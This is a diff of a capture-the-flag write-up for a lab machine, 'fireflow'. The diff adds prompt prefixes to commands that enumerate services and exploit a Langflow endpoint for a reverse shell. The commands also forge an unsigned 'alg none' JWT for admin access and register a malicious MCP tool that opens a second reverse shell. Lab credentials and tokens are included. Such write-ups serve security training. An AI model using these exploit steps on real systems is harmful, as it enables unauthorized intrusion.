@@ -24,7 +24,7 @@ difficulty: Medium
 The first step is to identify which services are exposed on the target. A full TCP scan helps determine the attack surface before any deeper inspection.
 
 ```bash
-nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.23.119
+tr3m0x@blackhat$ nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.23.119
 
 Warning: 10.129.23.119 giving up on port because retransmission cap hit (6).
 Nmap scan report for 10.129.23.119
@@ -37,7 +37,7 @@ PORT    STATE SERVICE
 two ports are open https and ssh .Let's perform a deeper service scan on the these ports:
 
 ```bash
-nmap -sC -sV -p 22,443 -oN scans/deepscan.nmap 10.129.23.119
+tr3m0x@blackhat$ nmap -sC -sV -p 22,443 -oN scans/deepscan.nmap 10.129.23.119
 
 Nmap scan report for fireflow.htb (10.129.23.119)
 Host is up (0.10s latency).
@@ -66,7 +66,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 We need first to add this to /etc/hosts
 
 ```bash
-echo "10.129.23.119 fireflow.htb" | sudo tee -a /etc/hosts"
+tr3m0x@blackhat$ echo "10.129.23.119 fireflow.htb" | sudo tee -a /etc/hosts"
 
 ```
 By visiting the website http://fireflow.htb we can see that it is mostly a static website 
@@ -75,7 +75,7 @@ By visiting the website http://fireflow.htb we can see that it is mostly a stati
 
 let's do some directory enumeration to see if there are any intresting directories  
 ```bash
-ffuf -u https://fireflow.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
+tr3m0x@blackhat$ ffuf -u https://fireflow.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -103,7 +103,7 @@ ________________________________________________
 nothing special so let's move to subdomain enumeration to see if the target has any virtual hosts
 
 ```bash
-ffuf -u https://fireflow.htb -H "Host: FUZZ.fireflow.htb" -w $SECLISTS/Discovery/DNS/subdomains-top1million-20000.txt -fw 5
+tr3m0x@blackhat$ ffuf -u https://fireflow.htb -H "Host: FUZZ.fireflow.htb" -w $SECLISTS/Discovery/DNS/subdomains-top1million-20000.txt -fw 5
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -134,7 +134,7 @@ flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duratio
 The subdomain `flow.fireflow.htb` appears to be a valid virtual host. Adding it to the hosts file makes it reachable for further inspection.
 
 ```bash 
-echo "10.129.23.119 flow.fireflow.htb" | sudo tee -a /etc/hosts
+tr3m0x@blackhat$ echo "10.129.23.119 flow.fireflow.htb" | sudo tee -a /etc/hosts
 
 ```
 Visiting http://flow.fireflow.htb we found a login page for **Langflow** .
@@ -144,7 +144,7 @@ Visiting http://flow.fireflow.htb we found a login page for **Langflow** .
 The initial login flow does not appear to work as expected. After creating an account and attempting to sign in, it becomes clear that the account requires approval. That makes direct authentication less useful, so the next step is to enumerate the application endpoints.
 
 ```bash
-ffuf -u https://flow.fireflow.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt -fw 132
+tr3m0x@blackhat$ ffuf -u https://flow.fireflow.htb/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt -fw 132
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -177,7 +177,7 @@ health                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 11
 The discovery reveals three endpoints. The /health endpoint is not useful, while /logs appears to be restricted, so the /docs endpoint is the best candidate for further exploration.
 
 ```bash
-curl https://flow.fireflow.htb/docs -k
+tr3m0x@blackhat$ curl https://flow.fireflow.htb/docs -k
 
     <!DOCTYPE html>
     <html>
@@ -217,7 +217,7 @@ The documentation references /openapi.json, which can be queried directly to ins
 
 
 ```bash
-curl https://flow.fireflow.htb/openapi.json -k | jq | grep -C 3 version
+tr3m0x@blackhat$ curl https://flow.fireflow.htb/openapi.json -k | jq | grep -C 3 version
   % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                  Dload  Upload  Total   Spent   Left   Speed
 100 141.9k 100 141.9k   0      0  59418      0   00:02   00:02          63183
@@ -246,7 +246,7 @@ Clicking it redirects us to **https://flow.fireflow.htb/playground/7d84d636-af65
 
 The proof of concept requires at least one public flow, so the next step is to adapt the exploit and execute it against the vulnerable endpoint. A listener is set up to receive the reverse shell.
 ```bash
-curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow'   -H 'Content-Type: application/json'   -b 'client_id=attacker'   -d '{
+tr3m0x@blackhat$ curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow'   -H 'Content-Type: application/json'   -b 'client_id=attacker'   -d '{
     "data": {
       "nodes": [{
         "id": "Exploit-001",
@@ -305,7 +305,7 @@ curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af6
 
 The request succeeds and a reverse shell is established as `www-data`.
 ```bash
-listen
+tr3m0x@blackhat$ listen
 Listening on 0.0.0.0 4444
 Connection received on 10.129.23.119 41438
 bash: cannot set terminal process group (1528): Inappropriate ioctl for device
@@ -462,7 +462,7 @@ nightfall@fireflow:~$
 Since the application exposes a web interface, the next logical step is directory enumeration 
 
 ```bash
-ffuf -u http://127.0.0.1:30080/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
+tr3m0x@blackhat$ ffuf -u http://127.0.0.1:30080/FUZZ -w $SECLISTS/Discovery/Web-Content/raft-small-directories.txt
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -494,14 +494,14 @@ The `/docs` endpoint exposes the service documentation, which is helpful for und
 
 The next step is to authenticate with the discovered credentials and test whether the application enforces role-based access correctly.
 ``` bash
-curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
+tr3m0x@blackhat$ curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
   -H 'Content-Type: application/json' \
   -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
 {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
 ```
 The authenticated user is not an administrator, so a direct request to the tools endpoint is rejected.
 ```bash
-curl -X 'POST' \
+tr3m0x@blackhat$ curl -X 'POST' \
   'http://127.0.0.1:30080/api/v1/tools' \
   -H 'accept: application/json' \
   -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps' \
@@ -527,7 +527,7 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRt
 
 We can now confirm that we have admin access by repeating the earlier request with the new token.
 ```bash
-curl -X 'POST' \
+tr3m0x@blackhat$ curl -X 'POST' \
   'http://127.0.0.1:30080/api/v1/tools' \
   -H 'accept: application/json' \
   -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
@@ -547,7 +547,7 @@ curl -X 'POST' \
 The next step is to register a custom tool that executes a payload and opens a reverse shell. This allows us to break out of the container and land on a shell inside the Kubernetes environment.
 
 ```bash
-curl -X 'POST' \
+tr3m0x@blackhat$ curl -X 'POST' \
   'http://127.0.0.1:30080/api/v1/tools' \
   -H 'accept: application/json' \
   -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ.' \
@@ -563,7 +563,7 @@ curl -X 'POST' \
 ```
 Now let's setup a listener and trigger the exploit 
 ```bash
-curl -X POST http://127.0.0.1:30080/mcp \
+tr3m0x@blackhat$ curl -X POST http://127.0.0.1:30080/mcp \
   -H 'Content-Type: application/json' \
   -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoiYWRtaW4ifQ." \
   -d '{"method":"tools/call","params":{"name":"Exploit","arguments":{}}}'
@@ -571,7 +571,7 @@ curl -X POST http://127.0.0.1:30080/mcp \
 ```
 And Boommm! We got the shell 
 ```bash
-listen
+tr3m0x@blackhat$ listen
 Listening on 0.0.0.0 4444
 Connection received on 10.129.23.119 53251
 $ id
@@ -582,7 +582,7 @@ $
 
 The shell is then upgraded for a more comfortable interactive session.
 ```bash
-python3 -c "import pty;pty.spawn('/bin/bash')"
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
 mcp@mcp-server-54464cb475-29ztf:/app$ export TERM=xterm
 export TERM=xterm
 mcp@mcp-server-54464cb475-29ztf:/app$
